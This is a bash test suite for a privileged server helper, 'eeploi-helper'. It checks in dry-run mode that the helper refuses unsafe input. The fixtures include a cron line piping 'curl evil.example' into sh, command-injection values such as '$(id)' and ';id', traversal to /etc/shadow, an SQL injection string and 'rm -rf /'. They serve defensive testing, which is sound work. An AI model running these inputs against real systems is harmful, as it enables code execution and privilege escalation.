#!/usr/bin/env bash
# Tests for eeploi-helper: bash -n, shellcheck (when installed) and many dry-run cases.
# No extra dependencies. Never run as root: nothing here needs it.
set -uo pipefail

ROOT=$(cd "$(dirname "$0")/.." && pwd)
HELPER="$ROOT/eeploi-helper"

if [ "$(id -u)" -eq 0 ]; then
  echo "Do not run the tests as root." >&2
  exit 1
fi

PASS=0
FAILED=0
FAILURES=""

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

pass() { PASS=$((PASS + 1)); }
failure() {
  FAILED=$((FAILED + 1))
  FAILURES="$FAILURES
  - $1"
  printf 'FAIL %s\n%s\n\n' "$1" "$2"
}

# Fixtures: /etc/eeploi variants and nginx.conf variants.
mkdir -p "$WORK/etc-empty" "$WORK/etc-new" "$WORK/etc-conf" "$WORK/etc-badline" "$WORK/etc-root" \
  "$WORK/etc-twice" "$WORK/etc-writable" "$WORK/etc-link" "$WORK/etc-inject" "$WORK/etc-newwritable"
chmod 755 "$WORK"/etc-*
touch "$WORK/etc-new/new-server"
touch "$WORK/etc-newwritable/new-server"
chmod 666 "$WORK/etc-newwritable/new-server"
printf '# eeploi\nDEPLOY_USER=deploy\n' > "$WORK/etc-conf/helper.conf"
printf 'DEPLOY_USER=deploy\nPATH=/tmp\n' > "$WORK/etc-badline/helper.conf"
printf 'DEPLOY_USER=root\n' > "$WORK/etc-root/helper.conf"
printf 'DEPLOY_USER=deploy\nDEPLOY_USER=other\n' > "$WORK/etc-twice/helper.conf"
printf 'DEPLOY_USER=deploy\n' > "$WORK/etc-writable/helper.conf"
chmod 666 "$WORK/etc-writable/helper.conf"
ln -s "$WORK/etc-conf/helper.conf" "$WORK/etc-link/helper.conf"
# shellcheck disable=SC2016
printf 'DEPLOY_USER=$(id)\n' > "$WORK/etc-inject/helper.conf"

printf 'user www-data;\nworker_processes auto;\nevents {}\n' > "$WORK/nginx-default.conf"
printf 'user ploi;\nworker_processes auto;\n' > "$WORK/nginx-ploi.conf"
printf 'user  nginx  web ; # comment\n' > "$WORK/nginx-group.conf"
printf 'worker_processes auto;\n# user nobody;\nhttp { userid on; }\n' > "$WORK/nginx-none.conf"
printf 'user www-data;\nuser ploi;\n' > "$WORK/nginx-two.conf"
printf 'user root;\n' > "$WORK/nginx-root.conf"
printf 'user www-data; include /tmp/x;\n' > "$WORK/nginx-junk.conf"
# shellcheck disable=SC2016 # the literal $(id) is the point: it must never run
printf 'user $(id);\n' > "$WORK/nginx-inject.conf"
printf 'user\twww-data;\n' > "$WORK/nginx-tab.conf"

# A copy with a well-formed (fake) release key, to test self-update past the key check.
FAKE_KEY='RWQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
sed "s#^PUBKEY=.*#PUBKEY='$FAKE_KEY'#" "$HELPER" > "$WORK/keyed-helper"

# call <args...>: run the helper in dry-run mode. Settings (temporary per call):
#   IN (stdin), AS (SUDO_USER, default eeploi), ETC_DIR, NGINX (nginx.conf), BIN (helper file), DRYRUN (1 or empty),
#   DBSTATE (what db-create's checks find)
call() {
  local dry=${DRYRUN-1}
  OUT=$(printf '%s' "${IN:-}" | env -i PATH="$PATH" \
    EEPLOI_HELPER_DRY_RUN="$dry" SUDO_USER="${AS-eeploi}" \
    EEPLOI_HELPER_ETC="${ETC_DIR:-$WORK/etc-empty}" \
    EEPLOI_HELPER_NGINX_CONF="${NGINX:-$WORK/nginx-default.conf}" \
    EEPLOI_HELPER_DB_STATE="${DBSTATE:-}" \
    bash "${BIN:-$HELPER}" "$@" 2>&1)
  CODE=$?
}

# ok <name> <expected output> <args...>: exit 0 and the output contains the text.
ok() {
  local name=$1 expected=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 0 ] && [[ $OUT == *"$expected"* ]]; then pass; else failure "$name" "exit $CODE, expected 0 and: $expected
$OUT"; fi
}

# lacks <name> <text> <args...>: exit 0 and the output does not contain the text.
lacks() {
  local name=$1 text=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 0 ] && [[ $OUT != *"$text"* ]]; then pass; else failure "$name" "exit $CODE, expected 0 and no: $text
$OUT"; fi
}

# refuse <name> <expected output> <args...>: exit 64 with an eeploi-helper message containing the text.
refuse() {
  local name=$1 expected=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 64 ] && [[ $OUT == *"eeploi-helper:"* ]] && [[ $OUT == *"$expected"* ]]; then pass; else failure "$name" "exit $CODE, expected 64 and: $expected
$OUT"; fi
}

check() {
  local name=$1
  shift
  if OUT=$("$@" 2>&1); then pass; else failure "$name" "$OUT"; fi
}

echo "== syntax"
check "bash -n eeploi-helper" bash -n "$HELPER"
check "bash -n tests/run.sh" bash -n "$ROOT/tests/run.sh"
if command -v shellcheck > /dev/null; then
  check "shellcheck" shellcheck "$HELPER" "$ROOT/tests/run.sh"
else
  echo "note: shellcheck is not installed, skipped (CI runs it)"
fi

echo "== existing subcommands"
ok "version" "1.0.0" version
ok "nginx-test" "run: nginx -t" nginx-test
ok "nginx-reload" "run: service nginx reload" nginx-reload
ok "php-fpm" "run: service php8.4-fpm reload" php-fpm-reload 8.4
ok "vhost" "write: /etc/nginx/sites-available/example.com (644)" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
ok "vhost-backup" "run: cp /etc/nginx/sites-available/example.com /var/lib/eeploi/nginx/example.com/vhost" vhost-backup example.com
ok "vhost-restore" "run: cp /var/lib/eeploi/nginx/example.com/vhost /etc/nginx/sites-available/example.com" vhost-restore example.com
ok "vhost-enable" "run: ln -sfn /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/example.com" vhost-enable example.com
ok "vhost-disable" "run: rm -f /etc/nginx/sites-enabled/example.com" vhost-disable example.com
ok "vhost-remove" "run: rm -f /etc/nginx/sites-enabled/example.com /etc/nginx/sites-available/example.com" vhost-remove example.com
ok "root" "root /home/eeploi/example.com/current/public;" vhost-set-root example.com /home/ploi/example.com/public /home/eeploi/example.com/current/public
ok "vhost-set-cert" "ssl_certificate /etc/nginx/ssl/eeploi-example.com.crt;" vhost-set-cert example.com
ok "ssl-csr" "run: openssl req -new -key /etc/nginx/ssl/eeploi-example.com.key -subj /CN=example.com" ssl-csr eeploi-example.com
IN=$'-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIU\n-----END CERTIFICATE-----\n' ok "certificate" "write: /etc/nginx/ssl/eeploi-example.com.crt (644)" ssl-write eeploi-example.com
ok "ssl-remove" "run: rm -f /etc/nginx/ssl/example.com.crt /etc/nginx/ssl/example.com.key" ssl-remove example.com
IN='php artisan horizon' ok "supervisor" "write: /etc/supervisor/conf.d/eeploi-example.com-horizon.conf (644)" \
  supervisor-write eeploi-example.com-horizon /home/eeploi/example.com/current 2
ok "supervisor-remove" "run: rm -f /etc/supervisor/conf.d/eeploi-example.com-a.conf" supervisor-remove eeploi-example.com-a
ok "supervisor-remove-site" "" supervisor-remove-site example.com
ok "pause" "run: mv /etc/supervisor/conf.d/worker-233475.conf /etc/supervisor/conf.d/worker-233475.conf.paused" supervisor-pause /etc/supervisor/conf.d/worker-233475.conf
ok "resume" "run: mv /etc/supervisor/conf.d/worker-233475.conf.paused /etc/supervisor/conf.d/worker-233475.conf" supervisor-resume /etc/supervisor/conf.d/worker-233475.conf
ok "supervisor-update" "run: supervisorctl update" supervisor-update
IN=$'* * * * * eeploi php8.4 /home/eeploi/example.com/current/artisan schedule:run > /dev/null 2>&1\n' \
  ok "cron" "write: /etc/cron.d/eeploi-example.com (644)" cron-write example.com
ok "cron-remove" "run: rm -f /etc/cron.d/eeploi-example.com" cron-remove example.com
ok "crontab-restore" "add back to /etc/crontab: the lines in /var/lib/eeploi/crontab/example.com" crontab-restore example.com
IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines" "remove from /etc/crontab: 0 3 * * * ploi php /home/ploi/a/artisan x" crontab-remove-lines example.com
IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines saves" "save: /var/lib/eeploi/crontab/example.com" crontab-remove-lines example.com
ok "env" "runuser -u eeploi -- sh -c" env-install /home/ploi/example.com/.env /home/eeploi/example.com/.env eeploi
ok "storage-copy" "run: tar -C /home/ploi/a/storage -cf - . | runuser -u eeploi -- tar -C /home/eeploi/a/storage -xf - --no-same-owner" storage-copy /home/ploi/a/storage /home/eeploi/a/storage eeploi

echo "== refusals"
AS='' refuse "not through sudo" "run through sudo" version
AS=root refuse "root as caller" "run through sudo" version
AS=www-data refuse "other user as caller" "run through sudo" version
refuse "no subcommand" "usage"
refuse "unknown subcommand" "unknown subcommand" rm -rf /
refuse "domain with a semicolon" "invalid domain" vhost-write 'example.com;id' /run/php/php8.4-fpm.sock
refuse "domain without a dot" "invalid domain" vhost-enable localhost
refuse "domain with a slash" "invalid domain" vhost-backup ../../etc/passwd
refuse "uppercase domain" "invalid domain" vhost-enable Example.com
refuse "php version" "invalid PHP version" php-fpm-reload '8.4;id'
refuse "php version without dot" "invalid PHP version" php-fpm-reload 84
refuse "path with .." "invalid path" env-install /home/ploi/a/../../etc/shadow /home/eeploi/x/.env eeploi
refuse "path outside home" "outside the allowed home folders" storage-copy /etc /home/eeploi/x/storage eeploi
refuse "path in another home" "outside the allowed home folders" storage-copy /home/root/x /home/eeploi/x/storage eeploi
AS=ploi refuse "copy from own home" "source cannot be in /home/ploi" env-install /home/ploi/a/.env /home/ploi/b/.env ploi
refuse "copy into ploi's home" "not in /home/eeploi" env-install /home/ploi/a/.env /home/ploi/b/.env eeploi
refuse "other owner" "owner must be eeploi" env-install /home/ploi/a/.env /home/eeploi/a/.env root
refuse "root as new root" "outside the allowed home folders" vhost-set-root example.com /home/ploi/x/public /etc
refuse "vhost-set-root arguments" "usage" vhost-set-root example.com /home/ploi/x/public
refuse "program name" "invalid program" supervisor-remove nginx
IN='id' refuse "daemon directory outside home" "outside the allowed home folders" supervisor-write eeploi-example.com-a /etc 1
IN='id' refuse "daemon directory in another home" "not in /home/eeploi" supervisor-write eeploi-example.com-a /home/ploi/a 1
IN='id' refuse "daemon processes" "processes must be 1 to 32" supervisor-write eeploi-example.com-a /home/eeploi/a 33
IN='id' refuse "daemon processes zero" "processes must be 1 to 32" supervisor-write eeploi-example.com-a /home/eeploi/a 0
IN='' refuse "daemon empty command" "empty command" supervisor-write eeploi-example.com-a /home/eeploi/a 1
refuse "pause any file" "invalid Supervisor config" supervisor-pause /etc/passwd
IN=$'* * * * * root php /home/eeploi/x/artisan schedule:run > /dev/null 2>&1\n' refuse "cron as root" "only" cron-write example.com
IN=$'* * * * * eeploi curl evil.example | sh\n' refuse "cron any command" "only" cron-write example.com
IN=$'* * * * * eeploi php /etc/x/artisan schedule:run > /dev/null 2>&1\n' refuse "cron outside home" "outside the allowed home folders" cron-write example.com
refuse "certificate name" "invalid domain" ssl-csr ../../etc/passwd
refuse "crontab-remove-lines arguments" "usage" crontab-remove-lines example.com /etc/passwd

echo "== root escapes (server-access audit, 2026-11-09)"
# vhost-write: the vhost is built by the helper; caller content can't reach nginx (root opens log files).
IN=$'access_log /etc/cron.d/x;\n' refuse "vhost from stdin" "usage" vhost-write example.com
IN=$'access_log /etc/cron.d/x;\n' lacks "vhost ignores stdin" "/etc/cron.d" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
ok "vhost logs in /var/log/nginx" "access_log /var/log/nginx/eeploi-example.com-access.log;" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
ok "vhost root in the caller's home" "root /home/eeploi/example.com/current/public;" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
refuse "vhost socket" "invalid PHP-FPM socket" vhost-write example.com /tmp/evil.sock
# ssl-include-write: gone; take-over backups are made and restored by root (vhost-backup, vhost-restore).
IN=$'access_log /etc/cron.d/x;\n' refuse "ssl include from stdin" "unknown subcommand" ssl-include-write example.com
refuse "vhost-read gone" "unknown subcommand" vhost-read example.com
refuse "ssl-read gone" "unknown subcommand" ssl-read example.com.key
# supervisor-write: built from arguments; one command line, log in /var/log/supervisor.
IN=$'[program:eeploi-example.com-a]\ncommand=id\nuser=eeploi\nstdout_logfile=/etc/cron.d/x\n' refuse "supervisor config from stdin" "usage" supervisor-write eeploi-example.com-a
IN=$'id\nstdout_logfile=/etc/cron.d/x' refuse "supervisor extra line" "one line" supervisor-write eeploi-example.com-a /home/eeploi/a 1
IN='php artisan horizon' ok "supervisor log in /var/log/supervisor" "stdout_logfile=/var/log/supervisor/eeploi-example.com-a.log" supervisor-write eeploi-example.com-a /home/eeploi/a 1
IN='php artisan horizon' ok "supervisor as the caller" "user=eeploi" supervisor-write eeploi-example.com-a /home/eeploi/a 1
# storage-copy and env-install: root only reads from /home/ploi or /home/forge; the caller writes.
refuse "storage from own home" "source must be in /home/ploi or /home/forge" storage-copy /home/eeploi/a/storage /home/eeploi/b/storage eeploi
refuse "env from own home" "source must be in /home/ploi or /home/forge" env-install /home/eeploi/a/.env /home/eeploi/b/.env eeploi
lacks "env not written by root" "install -o" env-install /home/ploi/a/.env /home/eeploi/a/.env eeploi
lacks "storage not written by root" "rsync" storage-copy /home/ploi/a/storage /home/eeploi/a/storage eeploi
# self-update: no downgrade below the installed version.
BIN="$WORK/keyed-helper" refuse "downgrade" "no downgrade" self-update 0.9.9
BIN="$WORK/keyed-helper" ok "same version" "download:" self-update 1.0.0
# crontab: only ploi or forge jobs in their home; restore adds back only those lines.
IN=$'17 * * * * root cd / && run-parts --report /etc/cron.hourly\n' refuse "system cron line" "only ploi or forge jobs" crontab-remove-lines example.com
IN=$'* * * * * ploi php /etc/x/artisan schedule:run\n' refuse "ploi job outside home" "only ploi or forge jobs" crontab-remove-lines example.com
IN='' refuse "no cron lines" "no lines given" crontab-remove-lines example.com
refuse "crontab-backup gone" "unknown subcommand" crontab-backup example.com
# ssl-write: only a PEM certificate.
IN=$'access_log /etc/cron.d/x;\n' refuse "ssl-write not a certificate" "not one PEM certificate" ssl-write example.com

echo "== deploy user from helper.conf"
lacks "default homes have no deploy" "deploy" version
AS=deploy refuse "deploy without config" "run through sudo" version
AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy from config" "1.0.0" version
AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy home allowed" "runuser -u deploy -- sh -c" env-install /home/ploi/a/.env /home/deploy/a/.env deploy
ETC_DIR="$WORK/etc-conf" ok "eeploi still allowed with config" "1.0.0" version
ETC_DIR="$WORK/etc-badline" refuse "config with another line" "invalid line" version
ETC_DIR="$WORK/etc-root" refuse "config with root" "cannot be root" version
ETC_DIR="$WORK/etc-twice" refuse "config set twice" "set twice" version
ETC_DIR="$WORK/etc-writable" refuse "config writable by others" "untrusted config" version
ETC_DIR="$WORK/etc-link" refuse "config as a link" "untrusted config" version
ETC_DIR="$WORK/etc-inject" refuse "config with a command" "invalid line" version
if [ ! -e /etc/eeploi/helper.conf ]; then
  DRYRUN='' AS=deploy ETC_DIR="$WORK/etc-conf" refuse "EEPLOI_HELPER_ETC ignored without dry run" "run through sudo" version
else
  echo "note: /etc/eeploi/helper.conf exists here, skipped the override test"
fi

echo "== firewall-close-22"
ETC_DIR="$WORK/etc-new" ok "with marker" "run: ufw delete allow 22/tcp" firewall-close-22
refuse "without marker" "only runs on a server eeploi created" firewall-close-22
ETC_DIR="$WORK/etc-newwritable" refuse "marker writable by others" "only runs on a server eeploi created" firewall-close-22
ETC_DIR="$WORK/etc-new" refuse "with arguments" "usage" firewall-close-22 now
if [ ! -e /etc/eeploi/new-server ]; then
  DRYRUN='' ETC_DIR="$WORK/etc-new" refuse "EEPLOI_HELPER_ETC ignored without dry run" "only runs on a server eeploi created" firewall-close-22
else
  echo "note: /etc/eeploi/new-server exists here, skipped the override test"
fi

echo "== acl-nginx"
ok "www-data" "run: setfacl -m u:www-data:x /home/eeploi" acl-nginx
NGINX="$WORK/nginx-ploi.conf" ok "ploi" "run: setfacl -m u:ploi:x /home/eeploi" acl-nginx
NGINX="$WORK/nginx-none.conf" ok "no user line" "run: setfacl -m u:www-data:x /home/eeploi" acl-nginx
NGINX="$WORK/nginx-tab.conf" ok "user line with a tab" "run: setfacl -m u:www-data:x /home/eeploi" acl-nginx
NGINX="$WORK/nginx-group.conf" ok "user and group" "check: user nginx and group web exist" acl-nginx
ok "checks the user exists" "check: user www-data and group www-data exist" acl-nginx
ok "installs acl when missing" "check: setfacl installed, else apt-get install acl" acl-nginx
AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy home" "run: setfacl -m u:www-data:x /home/deploy" acl-nginx
NGINX="$WORK/nginx-two.conf" refuse "two user lines" "more than one user line" acl-nginx
NGINX="$WORK/nginx-root.conf" refuse "nginx as root" "nginx runs as root" acl-nginx
NGINX="$WORK/nginx-junk.conf" refuse "user line with more" "cannot read the user line" acl-nginx
NGINX="$WORK/nginx-inject.conf" refuse "user line with a command" "cannot read the user line" acl-nginx
NGINX="$WORK/missing.conf" refuse "no nginx.conf" "nginx config not found" acl-nginx
refuse "acl-nginx arguments" "usage" acl-nginx www-data

echo "== php-pool-write"
ok "pool file" "write: /etc/php/8.4/fpm/pool.d/eeploi.conf (644)" php-pool-write 8.4
ok "pool name" "[eeploi]" php-pool-write 8.4
ok "pool user" "user = eeploi" php-pool-write 8.4
ok "pool group" "group = eeploi" php-pool-write 8.4
ok "pool socket" "listen = /run/php/php8.4-fpm-eeploi.sock" php-pool-write 8.4
ok "socket owner" "listen.owner = www-data" php-pool-write 8.4
ok "socket group" "listen.group = www-data" php-pool-write 8.4
ok "socket mode" "listen.mode = 0660" php-pool-write 8.4
ok "ondemand" "pm = ondemand" php-pool-write 8.4
ok "timeout" "request_terminate_timeout = 300" php-pool-write 8.4
ok "test before reload" "run: php-fpm8.4 -t
run: service php8.4-fpm reload" php-pool-write 8.4
NGINX="$WORK/nginx-ploi.conf" ok "socket for ploi" "listen.owner = ploi" php-pool-write 8.3
AS=deploy ETC_DIR="$WORK/etc-conf" ok "pool as deploy" "user = deploy" php-pool-write 8.4
refuse "pool version" "invalid PHP version" php-pool-write '8.4/../../x'
refuse "pool version missing" "usage" php-pool-write
refuse "pool two versions" "usage" php-pool-write 8.3 8.4
NGINX="$WORK/nginx-root.conf" refuse "pool with nginx as root" "nginx runs as root" php-pool-write 8.4

echo "== vhost-set-socket"
ok "to eeploi socket" "fastcgi_pass unix:/run/php/php8.4-fpm-eeploi.sock;" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
ok "only the exact line" 'fastcgi_pass unix:/var/run/php/php8\.4-fpm\.sock;' vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
ok "nginx -t then reload" "run: nginx -t
run: service nginx reload" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
ok "rollback" "fastcgi_pass unix:/var/run/php/php8.4-fpm.sock;" vhost-set-socket example.com /run/php/php8.4-fpm-eeploi.sock /var/run/php/php8.4-fpm.sock
ok "run/php default" "unix:/run/php/php8.3-fpm-eeploi.sock;" vhost-set-socket example.com /run/php/php8.3-fpm.sock /run/php/php8.3-fpm-eeploi.sock
refuse "socket elsewhere" "invalid PHP-FPM socket" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /tmp/evil.sock
refuse "socket with .." "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/../php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
refuse "socket with a semicolon" "invalid PHP-FPM socket" vhost-set-socket example.com '/run/php/php8.4-fpm.sock;' /run/php/php8.4-fpm-eeploi.sock
refuse "socket other pool" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-root.sock
refuse "same socket" "same socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm.sock
refuse "socket domain" "invalid domain" vhost-set-socket 'example.com;id' /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
refuse "socket arguments" "usage" vhost-set-socket example.com /run/php/php8.4-fpm.sock

echo "== self-update"
sed "s#^PUBKEY=.*#PUBKEY='RWS...REPLACE_WITH_RELEASE_KEY'#" "$HELPER" > "$WORK/placeholder-helper"
BIN="$WORK/placeholder-helper" refuse "placeholder key" "PUBKEY is the placeholder" self-update 1.2.3
ok "verify with the release key" "run: minisign -V -q -P $(sed -n "s/^PUBKEY='\\(.*\\)'$/\\1/p" "$HELPER")" self-update 1.2.3
refuse "bad version" "invalid version" self-update 1.2
refuse "version with v" "invalid version" self-update v1.2.3
refuse "version with leading zero" "invalid version" self-update 01.2.3
refuse "version with suffix" "invalid version" self-update 1.2.3-beta
refuse "version with a path" "invalid version" self-update '1.2.3/../../x'
refuse "version with a newline" "invalid version" self-update $'1.2.3\nid'
refuse "no version" "usage" self-update
BIN="$WORK/keyed-helper" ok "download url" "download: https://github.com/eeploi/helper/releases/download/v1.2.3/eeploi-helper" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "signature url" "download: https://github.com/eeploi/helper/releases/download/v1.2.3/eeploi-helper.minisig" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "verify with the built-in key" "run: minisign -V -q -P $FAKE_KEY" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "version check" "check: <download>/eeploi-helper version = 1.2.3" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "install" "install: /usr/local/sbin/eeploi-helper (root:root 755)" self-update 1.2.3
BIN="$WORK/keyed-helper" refuse "bad version with a key" "invalid version" self-update 1.2.3.4
sed "s#^PUBKEY=.*#PUBKEY='RWQshort'#" "$HELPER" > "$WORK/badkey-helper"
BIN="$WORK/badkey-helper" refuse "malformed key" "invalid release key" self-update 1.2.3

echo "== db-create"
PW='test-password-1234567890'
# What the checks find on the database server, one file per case (key=count, as the helper reads it).
db_state() { printf 'mariadb=%s\ndb_exists=%s\nuser_exists=%s\nuser_global=%s\nuser_elsewhere=%s\ndb_others=%s\ngranted=%s\n' "$@"; }
db_state 0 0 0 0 0 0 0 > "$WORK/db-mysql-fresh"
db_state 1 0 0 0 0 0 0 > "$WORK/db-mariadb-fresh"
db_state 0 1 1 0 0 0 1 > "$WORK/db-mysql-done"
db_state 0 0 1 0 0 0 0 > "$WORK/db-mysql-user"
db_state 0 0 1 0 0 0 1 > "$WORK/db-mysql-dropped"
db_state 0 1 0 0 0 0 1 > "$WORK/db-mysql-grant-only"
db_state 0 1 1 0 0 1 0 > "$WORK/db-mysql-taken"
db_state 0 1 1 0 0 1 1 > "$WORK/db-mysql-shared"
db_state 0 1 0 0 0 0 0 > "$WORK/db-mysql-nobody"
db_state 0 0 1 1 0 0 0 > "$WORK/db-mysql-global"
db_state 0 0 1 0 1 0 0 > "$WORK/db-mysql-elsewhere"
db_state 0 1 1 0 0 0 1 | sed 1d > "$WORK/db-pgsql-done"
db_state 0 1 1 0 0 1 0 | sed 1d > "$WORK/db-pgsql-taken"
printf 'db_exists=0\nuser_exists=0\nPATH=/tmp\n' > "$WORK/db-junk"
printf 'mariadb=0\ndb_exists=0\nuser_exists=0\n' > "$WORK/db-short"

IN=$PW ok "mysql created" "created: mysql database shop for user shop" db-create mysql shop shop
IN=$PW ok "mysql through the socket as root" "HOME=/root LC_ALL=C mysql --protocol=socket --user=root" db-create mysql shop shop
IN=$PW ok "mysql with a clean environment" "run: env -i PATH=" db-create mysql shop shop
IN=$PW ok "mysql statement log off first" "(SQL on stdin)
  SET SESSION sql_log_off = 1;" db-create mysql shop shop
IN=$PW ok "mysql user on localhost" "CREATE USER 'shop'@'localhost' IDENTIFIED BY '<password>';" db-create mysql shop shop
IN=$PW ok "mysql database utf8mb4" 'CREATE DATABASE `shop_db` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;' db-create mysql shop_db shop
IN=$PW ok "mysql grant on that database only" 'GRANT ALL PRIVILEGES ON `shop\_db`.* TO '"'shop'@'localhost';" db-create mysql shop_db shop
IN=$PW lacks "mysql no global grant" 'ON *.*' db-create mysql shop_db shop
IN=$PW ok "mysql checks both grant spellings" "Db IN ('shop_db', 'shop\\\\_db')" db-create mysql shop_db shop
IN=$PW ok "mariadb client" "LC_ALL=C mariadb --protocol=socket --user=root" db-create mariadb shop shop
IN=$PW ok "mariadb created" "created: mariadb database shop for user shop" db-create mariadb shop shop
IN=$PW ok "pgsql as postgres" "runuser -u postgres -- psql -X -q -A -t --no-password -v ON_ERROR_STOP=1 -d postgres" db-create pgsql shop shop
IN=$PW ok "pgsql statement logs off" "SET log_statement = 'none';
  SET log_min_duration_statement = -1;
  SET log_min_error_statement = 'panic';
  SET pg_stat_statements.track_utility = off;" db-create pgsql shop shop
IN=$PW ok "pgsql role without rights" "CREATE ROLE \"shop\" LOGIN NOSUPERUSER NOCREATEDB NOCREATEROLE NOREPLICATION NOBYPASSRLS PASSWORD '<password>';" db-create pgsql shop shop
IN=$PW ok "pgsql database owned by the user" "CREATE DATABASE \"shop_db\" OWNER \"shop\" ENCODING 'UTF8' TEMPLATE template0;" db-create pgsql shop_db shop
IN=$PW ok "pgsql closed to others" "REVOKE ALL ON DATABASE \"shop_db\" FROM PUBLIC;" db-create pgsql shop_db shop
IN=$PW ok "pgsql created" "created: pgsql database shop for user shop" db-create pgsql shop shop
IN=$PW ok "longest names" "created: mysql database a2345678901234567890123456789012 for user b2345678901234567890123456789012" \
  db-create mysql a2345678901234567890123456789012 b2345678901234567890123456789012
IN="$PW"$'\n' ok "password with a trailing newline" "created:" db-create mysql shop shop
IN='Az09._~+/=-Az09._~+/=-Az09._~+/=-' ok "password with every allowed sign" "created:" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-done" ok "already there" "exists: mysql database shop for user shop, nothing changed" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-done" lacks "already there runs nothing" "run:" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-pgsql-done" ok "pgsql already there" "exists: pgsql database shop for user shop, nothing changed" db-create pgsql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-user" ok "user existed" "(the user existed, its password is unchanged)" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-user" lacks "user existed keeps its password" "CREATE USER" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-dropped" ok "grant left from a dropped database" 'CREATE DATABASE `shop`' db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-dropped" lacks "grant not given twice" "GRANT ALL" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-grant-only" ok "user missing for a granted database" "CREATE USER 'shop'@'localhost'" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mariadb-fresh" ok "mariadb state" "created: mariadb" db-create mariadb shop shop

echo "== db-create refusals"
IN=$PW refuse "db no arguments" "usage: db-create <engine> <name> <user>" db-create
IN=$PW refuse "db two arguments" "usage" db-create mysql shop
IN=$PW refuse "db four arguments" "usage" db-create mysql shop shop "$PW"
IN=$PW refuse "unknown engine" "invalid database engine: sqlite" db-create sqlite shop shop
IN=$PW refuse "engine uppercase" "invalid database engine" db-create MySQL shop shop
IN=$PW refuse "engine postgres" "invalid database engine" db-create postgres shop shop
IN=$PW refuse "engine with a command" "invalid database engine" db-create 'mysql;id' shop shop
for bad in Shop shop-db shop.db 'shop;id' "shop'x" 'shop`x' 'shop"x' 'shop x' 'shop$x' '1shop' '_shop' '' \
  a23456789012345678901234567890123 $'shop\nid' 'shop%' 'sh\op'; do
  IN=$PW refuse "database name '$bad'" "invalid database name" db-create mysql "$bad" shop
  IN=$PW refuse "user name '$bad'" "invalid user name" db-create pgsql shop "$bad"
done
for reserved in mysql information_schema performance_schema sys postgres template0 template1 root pg_shop; do
  IN=$PW refuse "reserved database $reserved" "reserved database name: $reserved" db-create mysql "$reserved" shop
  IN=$PW refuse "reserved user $reserved" "reserved user name: $reserved" db-create pgsql shop "$reserved"
done
IN='' refuse "no password" "the password on stdin must be 16 to 128 characters" db-create mysql shop shop
IN='short-password1' refuse "password too short" "16 to 128" db-create mysql shop shop
IN=$(printf '%0129d' 0) refuse "password too long" "16 to 128" db-create mysql shop shop
IN=$(printf '%0300d' 0) refuse "password far too long" "16 to 128" db-create mysql shop shop
IN="$PW'; DROP USER root; --" refuse "password with a quote" "16 to 128" db-create mysql shop shop
IN="$PW\\" refuse "password with a backslash" "16 to 128" db-create mysql shop shop
IN="$PW x" refuse "password with a space" "16 to 128" db-create mysql shop shop
IN="$PW\$(id)" refuse "password with a command" "16 to 128" db-create mysql shop shop
IN="$PW"$'\n'"$PW" refuse "password on two lines" "16 to 128" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-fresh" refuse "mariadb on a MySQL server" "this server runs MySQL, not MariaDB" db-create mariadb shop shop
IN=$PW DBSTATE="$WORK/db-mariadb-fresh" refuse "mysql on a MariaDB server" "this server runs MariaDB, not MySQL" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-taken" refuse "database of another user" "database shop belongs to another user" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-shared" refuse "database shared with another user" "database shop belongs to another user" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-pgsql-taken" refuse "pgsql database of another owner" "database shop belongs to another user" db-create pgsql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-nobody" refuse "database nobody has" "database shop exists and is not shop's" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-global" refuse "user with global rights" "user shop has rights beyond one database" db-create mysql shop shop
IN=$PW DBSTATE="$WORK/db-mysql-elsewhere" refuse "user on another database" "user shop has rights on another database" db-create mysql shop shop
